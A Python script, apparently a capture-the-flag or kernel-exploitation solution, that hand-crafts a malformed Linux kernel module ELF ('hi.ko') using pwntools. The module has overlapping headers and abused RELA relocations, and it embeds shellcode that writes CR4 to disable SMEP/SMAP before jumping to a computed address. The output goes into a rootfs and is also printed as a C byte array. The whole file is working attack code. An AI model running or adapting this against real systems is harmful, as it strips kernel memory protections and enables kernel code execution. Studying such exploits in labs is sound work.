from ctypes import *
from minelf import ELF
from pwn import context, asm
import sys
import builtins

context.clear(arch="amd64")
def print(msg: str):
    builtins.print(msg, file=sys.stderr)

SHT_PROGBITS = 1
SHT_SYMTAB = 2
SHT_STRTAB = 3
SHT_RELA = 4
SHT_NOBITS = 8
SHT_REL = 9

ET_REL = 1

SHF_WRITE = 1
SHF_ALLOC = 2
SHF_EXECINSTR = 4

R_X86_64_NONE = 0
R_X86_64_64	= 1
R_X86_64_PC32 = 2
R_X86_64_PC64 = 24

raw = bytearray(0x1000)
elf = ELF(raw, bits=64, little_endian=True)

def untethered_section():
    return elf.Section()

# section_names = untethered_section()
# section_names.content = b"" # b"vermagic=6.3.0 SMP preempt mod_unload \x00"
# section_names.flags |= SHF_ALLOC | SHF_EXECINSTR
# section_names.type = SHT_PROGBITS
# section_names.alignment = 0x4000

zero = untethered_section()
zero.content = b""

module = untethered_section()
module.name = 0
module.content = bytearray(b"".ljust(sizeof(elf.Symbol), b"\x00"))
module.flags |= SHF_ALLOC | SHF_WRITE
module.type = SHT_SYMTAB

relocs = untethered_section()
relocs.name = 25
relocs.content = b""
relocs.flags |= SHF_ALLOC
relocs.type = SHT_RELA
relocs.alignment = 0

sections = [
    zero,
    # section_names,
    module,
    relocs,
]

zeroindex = sections.index(zero)
stubindex = sections.index(relocs)
modindex = sections.index(module)
# strindex = sections.index(section_names)
strindex = modindex
module.link = strindex

sym = elf.Symbol()
# sym.name = int.from_bytes(b"abcd", byteorder="little")
sym.section_index = modindex
module.content += sym
module.content[0:25] = b".gnu.linkonce.this_module"

shellcode = asm(
"""
.intel_syntax noprefix
mov eax, 0x6f0
mov cr4, rax
shl eax, 2
push rax
ret
ret
"""
)
print(f"{len(shellcode) = }")
adjustment = 0x190

relocs.info = modindex
rel = elf.Reloca()
rel.offset = 400
rel.sym = 1
rel.type = R_X86_64_64
rel.addend = -0x30 - adjustment
relocs.content += rel
rel = elf.Reloca()
rel.offset = 320
rel.sym = 1
rel.type = R_X86_64_64
rel.addend = -0x4030 - adjustment
relocs.content += rel
rel = elf.Reloca()
rel.offset = 332
rel.sym = 1
rel.type = R_X86_64_PC32
rel.addend = 0x1000 + 332 - adjustment
relocs.content += rel

# section names

# for i, section in enumerate(sections):
#     if hasattr(section, "cname"):
#         section.name = len(section_names.content)
#         section_names.content += section.cname + b"\x00"
# for i, section in enumerate(sections):
#     if not hasattr(section, "cname"):
#         section.name = len(modindex.content)-1

# setup init relocation

rel = elf.Reloca()
rel.offset = 312
rel.sym = 1
rel.type = R_X86_64_64
rel.addend = -0x4030 + len(relocs.content) + sizeof(elf.Reloca) - adjustment
relocs.content += rel

relocs.content += shellcode

# setup shellcode

# section_names.content += b"\xc3"

# null terminate section names

# if section_names.content[-1] != 0:
#     section_names.content += b"\x00"

# begin writing

header_overlap = 48
offset = sizeof(elf.Header)-header_overlap
print(f"end of elf header = {offset}")

# setup section headers

for i, section in enumerate(sections):
    elf.raw_elf_bytes[offset:offset+sizeof(elf.Section)] = section
    sections[i] = elf.Section.from_buffer(elf.raw_elf_bytes, offset)
    sections[i].content = section.content
    offset += sizeof(elf.Section)

offset -= 8

elf.header.ident.magic = (c_uint8 * 4)(*bytearray(b"\x7fELF"))
elf.header.ident.bits = 2
elf.header.ident.endianness = 1
elf.header.type = ET_REL
elf.header.machine = 0x3e
elf.header.sizeof_section = sizeof(elf.Section)
elf.header.number_of_sections = len(sections)
elf.header.section_offset = sizeof(elf.Header)-header_overlap
elf.header.section_name_table_index = strindex

print(f"{sections[zeroindex].name = :#x}")

# setup section content

contents = [sections[zeroindex], sections[modindex], sections[stubindex]]
sections[modindex].content = sections[modindex].content[:-16]
# contents = [section for section in sections]
# contents.append(contents.pop(modindex))

for i, section in enumerate(contents):
    if section.type != 0:
        section.offset = offset

    section.size = len(section.content)
    elf.raw_elf_bytes[offset:offset+section.size] = section.content
    offset += len(section.content)
    print(f"{i} = {section.size}")

print(f"end of section content = {offset}")

sections[modindex].size += 16

with open("hi.ko", "wb+") as fp:
    fp.write(elf.raw_elf_bytes[:offset])
with open("rootfs/hi.ko", "wb+") as fp:
    fp.write(elf.raw_elf_bytes[:offset])

print(f"{offset = }")

b = list(bytes(elf.raw_elf_bytes[:offset]))
builtins.print(f"{{ {str(b)[1:-1]} }};")